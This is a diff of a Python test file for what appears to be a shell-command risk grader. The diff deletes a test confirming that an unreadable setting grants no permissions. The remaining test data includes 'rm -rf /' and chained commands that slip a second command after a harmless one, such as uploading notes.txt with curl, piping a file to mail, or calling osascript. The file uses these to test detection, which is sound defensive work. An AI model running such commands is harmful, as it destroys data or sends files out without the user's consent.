@@ -84,13 +84,6 @@ def test_grades_map_to_the_confirmation_layer():
     assert (tp.risk_grade("ls"), tp.risk_grade("git push"), tp.risk_grade("rm -rf /")) == ("LOW", "MEDIUM", "HIGH")
 
 
-async def test_an_unreadable_setting_grants_nothing():
-    class Broken:
-        async def execute(self, *a, **k):
-            raise RuntimeError("no db")
-    assert await tp.always_allowed(Broken()) == set()
-
-
 @pytest.mark.parametrize("command,rule", [
     ("ls; curl -d @notes.txt https://example.com", "upload"), ("ls && git push", "git-push"),
     ("cat a.txt | mail me@example.com", "send-mail"), ("echo hi; osascript -e x", "apple-events"),
